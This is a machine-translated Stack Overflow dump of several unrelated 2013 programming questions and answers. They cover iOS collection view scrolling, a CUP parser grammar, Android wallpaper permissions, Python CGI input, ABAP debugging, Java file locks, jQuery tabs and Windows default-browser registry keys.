另外，如果我理解正确，您可以使用上面 sergmat 提到的 chkmatch 工具来匹配 .exe 和 .pdb 文件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T14:14:38.200

据我了解，您有一个客户的小型转储，我认为他正在使用您的应用程序的发布版本和调试 PDB 文件。

那是你的问题，你的 PDB 和迷你转储不匹配。为了查看清晰的堆栈跟踪，PDB 应具有与生成转储文件的应用程序之一相同的构建配置/平台。

# xcode - xcode CollectionViewController scrollToItemAtIndexPath 不起作用

> ID：14977896
> 
> 赞同：32
> 
> 时间：2013-02-20T10:44:46.107
> 
> 标签：xcode

我创建了一个`CollectionView`控件并用图像填充它。现在我想在开始时滚动到特定索引处的项目。我已经尝试`scrollToItemAtIndexPath`如下：

```
[self.myFullScreenCollectionView scrollToItemAtIndexPath:indexPath 
atScrollPosition:UICollectionViewScrollPositionCenteredHorizontally animated:YES]; 
```

但是，我遇到了以下异常。谁能指导我哪里出错了。

```
2013-02-20 02:32:45.219 ControlViewCollection1[1727:c07] *** Assertion failure in 
-[UICollectionViewData layoutAttributesForItemAtIndexPath:], /SourceCache/UIKit_Sim/UIKit-2380.17
/UICollectionViewData.m:485 2013-02-20 02:32:45.221 ControlViewCollection1[1727:c07] must return a 
UICollectionViewLayoutAttributes instance from -layoutAttributesForItemAtIndexPath: for path 
<NSIndexPath 0x800abe0> 2 indexes [0, 4] 
```

* * *

## 回答 #1

> 赞同：77
> 
> 时间：2013-03-06T02:30:11.993

无论是 bug 还是功能，UIKit 在布局子视图`scrollToItemAtIndexPath:atScrollPosition:Animated`之前调用时都会抛出此错误。`UICollectionView`

作为一种解决方法，将您的滚动调用移动到视图控制器生命周期中您确定它已经计算其布局的位置，如下所示：

```
@implementation CollectionViewControllerSubclass

- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];

    // scrolling here doesn't work (results in your assertion failure)
}

- (void)viewDidLayoutSubviews
{
    [super viewDidLayoutSubviews];

    NSIndexPath *indexPath = // compute some index path

    // scrolling here does work
    [self.collectionView scrollToItemAtIndexPath:indexPath
                                atScrollPosition:UICollectionViewScrollPositionCenteredHorizontally
                                        animated:YES];
}

@end 
```

至少，错误消息应该更有帮助。我打开了一个[rdar://13416281](http://openradar.appspot.com/13416281)；请欺骗。

* * *

## 回答 #2

> 赞同：53
> 
> 时间：2015-02-26T20:23:40.487

如果您在加载视图控制器时尝试滚动，请确保在调用`layoutIfNeeded`之前`UICollectionView`调用`scrollToItemAtIndexPath`. 这比将滚动逻辑放在 viewDidLayoutSubviews 中要好，因为您不会在每次布局父视图的子视图时执行滚动操作。

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2017-12-18T22:28:05.663

有时`collectionView(_:didSelectItemAt:)`要么不在主线程上调用，要么阻塞它，导致`scrollToItem(at:at:animated:)`不做任何事情。

通过执行以下操作解决此问题：

```
DispatchQueue.main.async {
  collectionView.scrollToItem(at: indexPath, at: .centeredHorizontally, animated: true)
} 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2017-03-22T23:18:18.110

从 iOS 9.3、Xcode 8.2.1、Swift 3 开始：

调用`scrollToItem(at:)`from`viewWillAppear()`仍然无法正常工作，尤其是在您使用 Section Headers/Footers、Auto Layout、Section Insets 时。

即使您调用`setNeedsLayout()`和`layoutIfNeeded()`，`collectionView`行为仍然很无聊。将滚动代码放入动画块并不可靠。

如其他答案所示，解决方案是仅`scrollToItem(at:)`在确定所有内容都已布置好后才致电。即在`viewDidLayoutSubviews()`.

但是，您需要有选择性；您不想每次`viewWillLayoutSubviews()`调用时都执行滚动。所以一个解决方案是在 中设置一个标志`viewWillAppear()`，然后在 中对其进行操作`viewDidLayoutSubviews()`。

IE

```
fileprivate var needsDelayedScrolling = false

override func viewWillAppear(_ animated: Bool)
{
    super.viewWillAppear(animated)
    self.needsDelayedScrolling = true
    // ...
}

override func viewDidLayoutSubviews()
{
    super.viewDidLayoutSubviews()

    if self.needsDelayedScrolling {
        self.needsDelayedScrolling = false
        self.collectionView!.scrollToItem(at: someIndexPath,
                at: .centeredVertically,
                animated: false)
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2014-04-07T11:58:19.107

你可以在 viewDidLoad 方法上做到这一点

只需调用 preformBatchUpdates

```
[self performBatchUpdates:^{
        if ([self.segmentedDelegate respondsToSelector:@selector(segmentedBar:selectedIndex:)]){
            [self.segmentedDelegate segmentedBar:self selectedIndex:_selectedPage];
        }
    } completion:^(BOOL finished) {
        if (finished){
            [self scrollToItemAtIndexPath:[NSIndexPath indexPathForItem:_selectedPage inSection:0] atScrollPosition:UICollectionViewScrollPositionCenteredHorizontally animated:YES];
        }

    }]; 
```

在我的情况下，我的子类 CollectionView 有一个属性 selectedPage，并且在这个属性的设置器上我调用

```
- (void)setSelectedPage:(NSInteger)selectedPage {
    _selectedPage = selectedPage;
    [self performBatchUpdates:^{
        if ([self.segmentedDelegate respondsToSelector:@selector(segmentedBar:selectedIndex:)]){
            [self.segmentedDelegate segmentedBar:self selectedIndex:_selectedPage];
        }
    } completion:^(BOOL finished) {
        if (finished){
            [self scrollToItemAtIndexPath:[NSIndexPath indexPathForItem:_selectedPage inSection:0] atScrollPosition:UICollectionViewScrollPositionCenteredHorizontally animated:YES];
        }

    }];
} 
```

在视图控制器中，我通过代码调用它

```
- (void)viewDidLoad {
    [super viewDidLoad];
    self.navigationBar.segmentedPages.selectedPage = 1;
} 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2013-08-14T09:01:57.710

另请记住，您需要使用正确的 UICollectionviewScrollPosition 值。请参阅下面的代码以进行说明：

```
typedef NS_OPTIONS(NSUInteger, UICollectionViewScrollPosition) {
UICollectionViewScrollPositionNone                 = 0,

/* For a view with vertical scrolling */
// The vertical positions are mutually exclusive to each other, but are bitwise or-able with the horizontal scroll positions.
// Combining positions from the same grouping (horizontal or vertical) will result in an NSInvalidArgumentException.
UICollectionViewScrollPositionTop                  = 1 << 0,
UICollectionViewScrollPositionCenteredVertically   = 1 << 1,
UICollectionViewScrollPositionBottom               = 1 << 2,

/* For a view with horizontal scrolling */
// Likewise, the horizontal positions are mutually exclusive to each other.
UICollectionViewScrollPositionLeft                 = 1 << 3,
UICollectionViewScrollPositionCenteredHorizontally = 1 << 4,
UICollectionViewScrollPositionRight                = 1 << 5 
```

};

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2016-04-04T20:49:35.033

添加滚动逻辑`viewDidAppear`为我工作：

```
override func viewDidAppear(animated: Bool) {
    super.viewDidAppear(animated)
    self.collectionView?.scrollToItemAtIndexPath(
        someIndexPath,
        atScrollPosition: UICollectionViewScrollPosition.None,
        animated: animated)
} 
```

添加它`viewDidLoad`不起作用：它被忽略。

除非您想在任何时间发生任何变化时滚动逻辑调用，否则将其添加到其中`viewDidLayoutSubviews`不起作用。就我而言，它阻止用户手动滚动项目

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-03-10T13:41:35.533

**斯威夫特 3**

```
UIView.animate(withDuration: 0.4, animations: {
    myCollectionview.scrollToItem(at: myIndexPath, at: .centeredHorizontally, animated: false)
}, completion: {
    (value: Bool) in
    // put your completion stuff here
}) 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-01-25T00:28:00.627

这是基于@Womble 的回答，所有功劳归于他们：

该方法`viewDidLayoutSubviews()`被重复调用。对我（iOS 11.2）来说，它第一次被称为`collectionView.contentSize`is `{0,0}`。第二次，`contentSize`正确。因此，我不得不为此添加一个检查：

```
var needsDelayedScrolling = false

override func viewWillAppear(_ animated: Bool) {
    super.viewWillAppear(animated)
    self.needsDelayedScrolling = true
    // ...
}

override func viewDidLayoutSubviews() {
    super.viewDidLayoutSubviews()
    if self.needsDelayedScrolling && collectionView.contentSize.width > 0 {
        self.needsDelayedScrolling = false
        self.collectionView!.scrollToItem(at: someIndexPath,
                at: .centeredVertically,
                animated: false)
        }
    }
} 
```

添加额外的内容后，`&& collectionView.contentSize.width > 0`它工作得很好。

# parsing - 如何在 CUP 解析器语法中的两个标记之间定义至少一次出现的字符串

> ID：14977898
> 
> 赞同：0
> 
> 时间：2013-02-20T10:45:00.097
> 
> 标签：parsing, grammar, formal-languages, cup

我正在尝试在 LALR(1) 语法（使用 CUP 解析器）中定义一个非终结符号。要求

```
the <code> token must appear exactly two times, 
while <hour> token must appear at least one time. 
```

最后我想出了这个定义：

```
section     ::= hour_l CODE SC hour_l CODE SC hour_l ;
hour_l      ::= /* epsilon */ 
            | hour_l HOUR SC ; 
```

where`SC`是标记之间的分隔符（分号），并且`hour_l`是小时列表的非终端符号。这个解决方案有一个问题：`HOUR`不能存在，因为 epsilon 可以减少到`hour_l`. 除了指定所有可能性或使用 CUP 的语义功能（即在部分中放置多少次的计数器）之外，还有一个聪明的解决方案`HOUR`吗？我宁愿不使用语义来实现这一点；事实上，在我看来它与语法有关。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T20:55:00.723

我的一个朋友建议OOB的解决方案是使用有限状态机：

```
section     ::= c ;
a           ::= CODE SC ;
b           ::= a CODE SC ;
c           ::= c HOUR SC | b HOUR SC | e CODE SC ;
d           ::= HOUR SC | d HOUR SC ;
e           ::= e HOUR SC | a HOUR SC | d CODE SC ; 
```

`c`是本机接受的最终状态。我画了一个确定性有限自动机

![DFA](../Images/8a880b1eb45e0064bfbda49850e10d9b.png)

并将其转换为正确的正则语法。

希望能帮助到你。谢谢

# android - 动态壁纸需要哪些权限？

> ID：14977900
> 
> 赞同：1
> 
> 时间：2013-02-20T10:45:07.467
> 
> 标签：android, android-widget, android-manifest, android-permissions

为了设置动态壁纸和获取图库图像，我需要什么权限？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:49:39.377

你想给两个权限

> 1.  android:name="android.software.live_wallpaper" />
> 2.  android:permission="android.permission.BIND_WALLPAPER">

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:49:46.300

对于动态壁纸，请将以下内容放在您的服务标签中`manifest.xml`。

`android:permission="android.permission.BIND_WALLPAPER` `android:name="android.software.live_wallpaper`

对于**画廊**，这里是[链接](https://stackoverflow.com/questions/10473823/android-get-image-from-gallery-into-imageview)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:55:36.003

> 哪些是我设置动态壁纸的权限，但我无法获取图库图片

如果您的问题是相互关联的，那么权限与您无法*获取图库图像无关*

如果这是两个独立的问题，我建议：

1.  从一个好的教程开始。例如：[http ://www.vogella.com/articles/AndroidLiveWallpaper/article.html](http://www.vogella.com/articles/AndroidLiveWallpaper/article.html)
2.  发布有关在您的应用中获取图库图像的单独问题。

无论如何，要单独回答有关权限的问题，具体取决于您如何**配置**应用程序，

```
<uses-feature android:name="android.software.live_wallpaper" />
<uses-permission android:name="android.permission.BIND_WALLPAPER" /> 
```

为什么我说取决于你如何配置你的应用程序是因为这个。如果您查看链接的 Vogella 教程，则权限在属性`android:permission="android.permission.BIND_WALLPAPER" >`中声明。`service``application`

如果您查看本教程： http: [//www.codeproject.com/Articles/108390/How-To-Create-Android-Live-Wallpaper](http://www.codeproject.com/Articles/108390/How-To-Create-Android-Live-Wallpaper)，它已将权限设置为`application`标签。

这是（*然而*）另一个教程：http: [//mobile.tutsplus.com/tutorials/android/creating-live-wallpapers-on-android/](http://mobile.tutsplus.com/tutorials/android/creating-live-wallpapers-on-android/)

# python - 如何正确编写接收json数据的python cgi脚本？

> ID：14977901
> 
> 赞同：3
> 
> 时间：2013-02-20T10:45:07.870
> 
> 标签：python, tomcat, cgi

我当前的测试 python 脚本执行以下操作：

```
#!/usr/bin/env python
import sys
data = sys.stdin.read()
myjson = json.loads(data) 
```

问题是即使这在某些情况下有效，但在其他情况下它似乎会阻塞，可能在 read() 处。

由于其他一些原因，我被迫在 cgi 脚本中使用 tomcat，但不确定这是否重要。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:49:56.350

You'll need to check the content length before reading and limit the number of byte read by `sys.stdin.read()`. See [`cgi.parse_header()`](http://docs.python.org/2/library/cgi.html#cgi.parse_header).

**Update:**

Your incoming data comes through the environment which is populated by the web server. It is accessible in `os.environ`.

```
import os
from cgi import parse_header
os.environ['Content-Type'] = 'text/html; charset=utf-8'
parse_header(os.environ['Content-Type'])
# returns ('text/html', {'charset': 'utf-8'}) 
```

So in your CGI script you need (roughly):

```
import os, cgi, sys
cl, _ = parse_header(os.environ['Content-Length'])
data = sys.stdin.read(int(cl)) 
```

# debugging - 可以从 ABAP 调试器脚本中调用对象的方法吗？

> ID：14977902
> 
> 赞同：3
> 
> 时间：2013-02-20T10:45:10.267
> 
> 标签：debugging, scripting, abap

我只是发现了新的（对我的系统而言）ABAP 调试器脚本。

说这是我的程序：

```
* Assume i have the class LCL_SMTH with public methods INCREMENT and REFRESH

DATA: lo_smth TYPE REF TO lcl_smth.

CREATE OBJECT LO_SMTH.    
lo_smth->increment( ).

WRITE 'Nothing hapenned'. 
```

我可以让我的脚本在它退出 INCREMENT 后调用 REFRESH 方法吗？

我将脚本设置为在调用 INCREMENT 方法时执行，它确实这样做了。接下来我知道我必须退出 (F7) -> 我也这样做了 - 我只是不知道如何调用 REFRESH 方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T10:47:58.667

调试器脚本可以完全完成您可以手动执行的操作。所以你不能......除非你可以手动。由于您可以在调试器中手动跳转，因此调试器脚本也可以。因此，如果在代码中的某处有合适的 REFRESH 调用，那么您也可以跳转到那里并返回。

# java - Windows vs OSX FileLock OutputStreamWriter

> ID：14977905
> 
> 赞同：0
> 
> 时间：2013-02-20T10:45:18.400
> 
> 标签：java, windows, ioexception, filelock

我编写了一个访问文件的 java 应用程序，而其他 VM 中的其他进程尝试执行相同操作。因此我使用 FileLock 类：

```
FileOutputStream fos = new  FileOutputStream(filePath,append);
    FileChannel f = fos.getChannel();
    FileLock lock;

    while ((lock = f.tryLock()) == null){
        try {
            Thread.sleep(100);
        } catch (InterruptedException ex) {
            Logger.getLogger(Util.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    OutputStreamWriter out = new OutputStreamWriter( new FileOutputStream(filePath,append));
    out.write(textToWrite);
    out.close();
    lock.release(); 
```

在 Mac OSX 上一切正常，但是当我在 Windows 7 上运行代码时，它会在该行抛出一个 IOException

```
out.close(); 
```

, 尝试冲洗时。

```
java.io.IOException: The process cannot access the file because another process has locked a portion of the file
at java.io.FileOutputStream.writeBytes(Native Method) 
```

据我了解[FileLock 如何工作？](https://stackoverflow.com/questions/4025721/java-file-locking), 实际获得的锁

```
f.tryLock() 
```

禁止我访问它，因为另一个进程（显然是这个）具有排他锁。

现在这让我觉得很矛盾——当获得锁的实际行为阻碍我这样做时，我如何获得一个独占锁以使我能够写入文件而不会有其他进程弄乱它的危险？

因此，为什么它可以在 Mac OS 上运行而不是在 Windows 上运行？我从 JavaDocs 中知道 FileLock 类存在操作系统特定的差异和困难，但肯定不是针对其设计的功能。既然不能这样，我做错了，这就是我请求你帮助的地方。

谢谢，米

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:49:40.370

There is no file locking on UNIX.: [http://www.coderanch.com/t/551144/java/java/File-lock-doesn-prevent-threads](http://www.coderanch.com/t/551144/java/java/File-lock-doesn-prevent-threads). In fact, on UNIX, you can delete a file from under a process and it may not even notice...
So you need to use a lock file that you can check exists.
Paradoxically your code is working on Windows but not on UNIX (i.e. Mac OS), the exception should be the expected result of trying to write to a file that is locked by another process.

# jquery - jQuery UI 选项卡不适用于自定义设计

> ID：14977907
> 
> 赞同：0
> 
> 时间：2013-02-20T10:45:31.020
> 
> 标签：jquery, css, jquery-ui-tabs

我有三个简单的基于 jQuery 的选项卡，我无法使其与自定义 css 设计一起使用。如果指出问题，我将不胜感激，以便我可以帮助修复它并使其在没有任何动画或效果的选项卡切换时工作。

HTML 代码：[jsFiddle 链接](http://jsfiddle.net/svJtE/1/)

```
<html>
<head>
   <link rel="stylesheet" href="http://code.jquery.com/ui/1.10.1/themes/base/jquery-ui.css" />
<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
<script src="http://code.jquery.com/ui/1.10.1/jquery-ui.js"></script>
<script type="text/javascript">
   //For tabs
    $(function () {
        $("#tabs").tabs();
    });

    $('.tab_headers .tab_link_wrapper:nth-child(3n)').css('border-right', '0px');
    /*Since all the tabs are hidden with css we are displaying the tab with class .active_tab using fadeIn() 
    function. If you just want it to show with no effect, just put show() instead of fadeIn() */
    $('.active_tab').fadeIn();

    //when a tab link is clicked...  
    $('.tab_link').live('click', function (event) {

        /*...prevent the default behaviour...*/
        event.preventDefault();

        /* ...remove the tab_link_selected class from current active link... */
        $('.tab_link_selected').removeClass('tab_link_selected');

        /* ...and add it to the new active link */
        $(this).addClass('tab_link_selected');

        /*...get the title attribute (which corensponds to the id of the needed text container), 
        but you can use any attribute you want*/
        var container_id = $(this).attr('title');

        //...animate the current active_tab by changing it's height and opacity ...'  
        $('.active_tab').animate({

            height: 'toggle', opacity: 'toggle'

            //...and when that animation ends...  
        }, function () {

            //...remove the active_tab class from the current active tab...  
            $(this).removeClass('active_tab');

            //...and add that class to the tab that corensponds the clicked link...  
            $(container_id).addClass('active_tab');

            //...and animate the new active_tab by using toggle on height and opacity again...  
            $('.active_tab').animate({

               // height: 'toggle', opacity: 'swing'
                height: 'toggle', opacity: 'toggle'

            });
        });

</script>
<style type="text/css">
.tab_headers
{
    font-family: Helvetica, Georgia ,Tahoma, Arial,  sans-serif; 
    font-size:13px;
    font-weight:bold;
    background-color:#A78944;  
    min-height:25px;
    width:240px;
    overflow:hidden;
}  
.tab_link_wrapper
{
border-right:1px solid white;  
    float:left;
}
 .tab_link {  
float:left; /* important */  
/* just styling */  

background: #A78944;  
padding:5px 16px 4px 16px;  
margin-right:0px ;  
color:white;  
text-decoration:none; 

}  
.tab_link_selected{ background-color: #990044; } /* just a different tab link bg color when it's selected */  
.tab_text {  
display: none; /* hide the text containers */  
/* just styling */  
padding:0px;  
color:black; 
    font-family: Helvetica, Georgia ,Tahoma, Arial,  sans-serif; 
    font-size:13px;
    font-weight:normal;

}  
.clear {clear: both;}  

.lblCounter
{
    padding-right:5px;
    color:#990044;
    font-family:  Georgia ,Helvetica,Tahoma, Arial,  sans-serif; 
    text-decoration:none;
}
.popular-article-title
{
    overflow:hidden;
    color:#000;
    line-height:26px;
     font-family:  Georgia ,Helvetica,Tahoma, Arial,  sans-serif; 
    text-align:justify;
    vertical-align:middle;
    float:left;
    min-height:26px;
    width:228px;
    padding-left:5px;
    padding-right:5px;
    border-bottom:1px solid #EBEBEB;
     border-left:1px solid #EBEBEB;
      border-right:1px solid #EBEBEB;
     text-decoration:none;
}
.popular-links
{
    color:#000;
    text-decoration:none;
}
#tabs-popular-title
{
  width:240px;
  min-height:20px;
  padding:2px;
  text-align:left;
  color:#A78944;
  font-size:14px;
  font-weight:bold;
}
.most-popular-tabs-wrapper
{
    float:left;
    width:240px;
    margin-bottom:10px;
     overflow:hidden;
}
 </style>
 </head>
 </body>
 <div class="most-popular-tabs-wrapper">
<div id="tabs_wrapper">  
        <div class="tab_headers" id="tab_headers">
            <!--  the tab links  -->  
             <div class="tab_link_wrapper"><a title="#Articles" class="tab_link tab_link_selected" >Articles</a> </div> 
             <div class="tab_link_wrapper"><a title="#Writers" class="tab_link">Writers</a>  </div>
             <div class="tab_link_wrapper" style="border-right: 0px none;"><a title="#Videos" class="tab_link">Videos</a>  </div>
            <!--  end tab links  -->  
        </div>  
            <!--  clear it  -->  

            <!-- start tab text containers  -->  
        <div id="Articles" class="tab_text active_tab"  style="display: block;">  
            <div id="popular-article-wrapper">

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularArticles_lblCounter_0">1</span> 
                                 <a style="display:inline-block;border-width:0px;" href="article.aspx?PageID=5&amp;Language=en-US&amp;ParID=5&amp;Issue=5&amp;cid=16&amp;aid=17" class="popular-links" title="Belarus is open for business" id="MainContent_ucMostPopular_rptPopularArticles_hylnkArticle_0"><span id="MainContent_ucMostPopular_rptPopularArticles_lblArticleTitle_0">Article One title</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularArticles_lblCounter_1">2</span> 
                                 <a style="display:inline-block;border-width:0px;" href="article.aspx?PageID=5&amp;Language=en-US&amp;ParID=5&amp;Issue=5&amp;cid=1&amp;aid=15" class="popular-links" title="Sheikh Mohammed holds fast to his father’s legacy" id="MainContent_ucMostPopular_rptPopularArticles_hylnkArticle_1"><span id="MainContent_ucMostPopular_rptPopularArticles_lblArticleTitle_1">Article One title two</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularArticles_lblCounter_2">3</span> 
                                 <a style="display:inline-block;border-width:0px;" href="article.aspx?PageID=5&amp;Language=en-US&amp;ParID=5&amp;Issue=5&amp;cid=1&amp;aid=16" class="popular-links" title="It’s time the Lebanese removed their shackles" id="MainContent_ucMostPopular_rptPopularArticles_hylnkArticle_2"><span id="MainContent_ucMostPopular_rptPopularArticles_lblArticleTitle_2">Article three title</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularArticles_lblCounter_3">4</span> 
                                 <a style="display:inline-block;border-width:0px;" href="article.aspx?PageID=5&amp;Language=en-US&amp;ParID=5&amp;Issue=5&amp;cid=17&amp;aid=23" class="popular-links" title="Building Dubai together" id="MainContent_ucMostPopular_rptPopularArticles_hylnkArticle_3"><span id="MainContent_ucMostPopular_rptPopularArticles_lblArticleTitle_3">Article four title </span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularArticles_lblCounter_4">5</span> 
                                 <a style="display:inline-block;border-width:0px;" href="article.aspx?PageID=5&amp;Language=en-US&amp;ParID=5&amp;Issue=5&amp;cid=2&amp;aid=43" class="popular-links" title="A day for reflection and appreciation" id="MainContent_ucMostPopular_rptPopularArticles_hylnkArticle_4"><span id="MainContent_ucMostPopular_rptPopularArticles_lblArticleTitle_4">Article five title</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularArticles_lblCounter_5">6</span> 
                                 <a style="display:inline-block;border-width:0px;" href="article.aspx?PageID=5&amp;Language=en-US&amp;ParID=5&amp;Issue=5&amp;cid=6&amp;aid=18" class="popular-links" title="A Royal Visit" id="MainContent_ucMostPopular_rptPopularArticles_hylnkArticle_5"><span id="MainContent_ucMostPopular_rptPopularArticles_lblArticleTitle_5">Article seven title</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularArticles_lblCounter_6">7</span> 
                                 <a style="display:inline-block;border-width:0px;" href="article.aspx?PageID=5&amp;Language=en-US&amp;ParID=5&amp;Issue=6&amp;cid=1&amp;aid=27" class="popular-links" title="The United Nations, just an expensive show" id="MainContent_ucMostPopular_rptPopularArticles_hylnkArticle_6"><span id="MainContent_ucMostPopular_rptPopularArticles_lblArticleTitle_6">Article One title</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularArticles_lblCounter_7">8</span> 
                                 <a style="display:inline-block;border-width:0px;" href="article.aspx?PageID=5&amp;Language=en-US&amp;ParID=5&amp;Issue=6&amp;cid=1&amp;aid=26" class="popular-links" title="Sinister purpose behind anti-Islamic film" id="MainContent_ucMostPopular_rptPopularArticles_hylnkArticle_7"><span id="MainContent_ucMostPopular_rptPopularArticles_lblArticleTitle_7">Article One title</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularArticles_lblCounter_8">9</span> 
                                 <a style="display:inline-block;border-width:0px;" href="article.aspx?PageID=5&amp;Language=en-US&amp;ParID=5&amp;Issue=5&amp;cid=18&amp;aid=25" class="popular-links" title="Autobiography Launch" id="MainContent_ucMostPopular_rptPopularArticles_hylnkArticle_8"><span id="MainContent_ucMostPopular_rptPopularArticles_lblArticleTitle_8">Article One title</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularArticles_lblCounter_9">10</span> 
                                 <a style="display:inline-block;border-width:0px;" href="article.aspx?PageID=5&amp;Language=en-US&amp;ParID=5&amp;Issue=5&amp;cid=2&amp;aid=36" class="popular-links" title="Seismic shift " id="MainContent_ucMostPopular_rptPopularArticles_hylnkArticle_9"><span id="MainContent_ucMostPopular_rptPopularArticles_lblArticleTitle_9">Article One title</span></a>
                              </div>

            </div>
        </div>  
        <div id="Writers" class="tab_text"style="display: block;">  
            <div id="popular-writters-wrapper">

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularWriters_lblCounter_0">1</span> 
                                 <a style="display:inline-block;border-width:0px;" href="writer.aspx?PageID=17&amp;language=en-US&amp;issue=5&amp;ParID=1&amp;CID=0&amp;aid=-1&amp;wid=1" class="popular-links" title="Khalaf Ahmad Al Habtoor" id="MainContent_ucMostPopular_rptPopularWriters_hylnkArticle_0"><span id="MainContent_ucMostPopular_rptPopularWriters_lblArticleTitle_0">Writer One</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularWriters_lblCounter_1">2</span> 
                                 <a style="display:inline-block;border-width:0px;" href="writer.aspx?PageID=17&amp;language=en-US&amp;issue=5&amp;ParID=1&amp;CID=0&amp;aid=-1&amp;wid=2" class="popular-links" title="Joanna Andrews" id="MainContent_ucMostPopular_rptPopularWriters_hylnkArticle_1"><span id="MainContent_ucMostPopular_rptPopularWriters_lblArticleTitle_1">Writer two</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularWriters_lblCounter_2">3</span> 
                                 <a style="display:inline-block;border-width:0px;" href="writer.aspx?PageID=17&amp;language=en-US&amp;issue=5&amp;ParID=1&amp;CID=0&amp;aid=-1&amp;wid=3" class="popular-links" title="The Media Office" id="MainContent_ucMostPopular_rptPopularWriters_hylnkArticle_2"><span id="MainContent_ucMostPopular_rptPopularWriters_lblArticleTitle_2">The Media Office</span></a>
                              </div>

                            <div class="popular-article-title">
                                 <span class="lblCounter" id="MainContent_ucMostPopular_rptPopularWriters_lblCounter_3">4</span> 
                                 <a style="display:inline-block;border-width:0px;" href="writer.aspx?PageID=17&amp;language=en-US&amp;issue=5&amp;ParID=1&amp;CID=0&amp;aid=-1&amp;wid=4" class="popular-links" title="Linda S. Heard" id="MainContent_ucMostPopular_rptPopularWriters_hylnkArticle_3"><span id="MainContent_ucMostPopular_rptPopularWriters_lblArticleTitle_3">Writer four</span></a>
                              </div>

            </div>
        </div>  
        <div class="tab_text" id="Videos">  
                Comming Soon
         </div>  
     </div>
</div> 
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T13:50:26.257

您的代码只需稍作改动即可工作。

首先，您应该`style="display: block;"`从 id`#Articles"`和`#Writers`. 您已经完成了将您的内容添加`active_tab`到 id 的内容`#Articles`。

最后，您忘记用`});`.

[JSFiddle 源代码](http://jsfiddle.net/agriboz/svJtE/5/)/[结果](http://jsfiddle.net/agriboz/svJtE/5/embedded/result/)

# c# - 以编程方式更改 Windows 7 上的标准浏览器

> ID：14977911
> 
> 赞同：0
> 
> 时间：2013-02-20T10:45:42.660
> 
> 标签：c#, windows, windows-7, registry

首先，在继续使用代码片段更改注册表项之前，我需要设置正确的注册表项。

我已经尝试了我在互联网上找到的所有内容，这就是我现在在这里发布的原因。

[MSDN](http://support.microsoft.com/kb/224816)上提到的所有注册表项都不起作用。改变这些也不起作用：

```
HKEY_CLASSES_ROOT\http\shell\open\command

HKEY_CLASSES_ROOT\.htm

HKEY_CLASSES_ROOT\.html

HKEY_CLASSES_ROOT\http\shell\open\command

HKEY_CLASSES_ROOT\http\shell\open\ddeexec\Application

HKEY_CLASSES_ROOT\ftp\shell\open\command

HKEY_CLASSES_ROOT\ftp\shell\open\ddeexec\Application

HKEY_CLASSES_ROOT\gopher\shell\open\command

HKEY_CLASSES_ROOT\gopher\shell\open\ddeexec\Application

HKEY_CURRENT_USER\SOFTWARE\Clients\StartMenuInternet 
```

我的注册表不应该知道关于我的 Mozilla 的任何信息，因为我在每个条目中都输入了我自己的编码浏览器。

不知道该怎么办...

在获得正确的条目后，我会使用这样的代码片段来添加和更改条目：

```
 RegistryKey myKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\My Registry Key", true);

        myKey.SetValue("My String Value", "Test Value", RegistryValueKind.String);

        string myValue = (string)myKey.GetValue("My String Value"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-10T13:00:53.493

这有点晚了，也许太晚了，但其他人可能会从我的回答中受益。上面代码中更改的设置符合 Windows XP 而不是 Windows Vista 或 7。要在 Win Vista 或 7 中设置默认浏览器，请使用 CURRENT_USER 注册表项。干杯!

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T11:20:14.930

您可以使用 sysinternals 工具（我忘记了名称），它需要一个进程并记录所有 api 和注册表活动，并查看 Google-Chrome 是如何做到的。
或者您可以直接查看铬源代码。

或者你可能很懒，只使用谷歌，它会让你找到这个搜索结果：
[我如何使用 c# 或批处理文件更改默认浏览器](https://stackoverflow.com/questions/968449/how-do-i-change-default-browser-using-c-sharp-or-batch-file)

# eclipse - Eclipse - 可能有永久断点或两个断点选项卡？

> ID：14977918
> 
> 赞同：1
> 
> 时间：2013-02-20T10:46:14.557
> 
